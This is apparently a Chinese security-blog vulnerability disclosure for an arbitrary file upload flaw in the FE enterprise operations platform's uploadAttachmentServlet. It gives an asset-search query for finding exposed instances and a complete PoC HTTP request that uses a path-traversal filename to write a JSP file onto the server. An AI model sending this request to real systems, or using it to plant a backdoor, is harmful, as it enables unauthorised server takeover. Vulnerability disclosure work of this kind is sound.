#  飞企互联-FE企业运营管理平台uploadAttachmentServlet 任意文件上传漏洞   
 TKing的安全圈   2024-03-24 15:51  
  
#### 产品简介  
  
飞企互联-FE企业运营管理平台是一个基于云计算、智能化、大数据、物联网、移动互联网等技术支撑的云工作台。这个平台可以连接人、链接端、联通内外，支持企业B2B、C2B与O2O等核心需求，为不同行业客户的互联网+转型提供支持。其特色在于提供云端工作环境，整合了人工智能、大数据分析和物联网设备管理，为不同行业客户的互联网+转型提供全面支持。通过智能化的决策支持和数据驱动的业务优化，企业可以更灵活、高效地运营业务，实现数字化转型的战略目标。  
#### 漏洞概述  
  
飞企互联-FE企业运营管理平台 uploadAttachmentServlet存在文件上传漏洞，攻击者可通过该漏洞在服务器端写入后门文件，任意执行代码，获取服务器权限，进而控制整个 web 服务器。  
#### 资产测绘  
  
app=“飞企互联-FE企业运营管理平台” ![](https://mmbiz.qpic.cn/sz_mmbiz_png/6ibvMRtaFJHSia6y2redE6YDWYYic9fqibDfgDjF7E1hIfP6cuHexOw8icpvp7pXHgCO6TsfT4nlScdZUDUwtF94RicA/640?wx_fmt=png&from=appmsg "")  
  
#### 漏洞复现  
  
Poc:  
```

```  
```
POST /servlet/uploadAttachmentServlet HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Length: 325

------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/from.jsp"
Content-Type: text/plain

<% out.println("123123");%>
------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="json"

{"iq":{"query":{"UpdateType":"mail"}}}
------WebKitFormBoundaryKNt0t4vBe8cX9rZk--

```  
```
；
```  
#### 修复建议  
  
升级至最新安全版本。  
```
公众号技术文章仅供诸位网络安全工程师对自己所管辖的网站、服务器、网络进行检测或维护时参考用，公众号的检测工具仅供各大安全公司的安全测试员安全测试使用。未经允许请勿利用文章里的技术资料对任何外部计算机系统进行入侵攻击，公众号的各类工具均不得用于任何非授权形式的安全测试。公众号仅提供技术交流，不对任何成员利用技术文章或者检测工具造成任何理论上的或实际上的损失承担责任。加微信进群获取更多资源：
```  
  
  
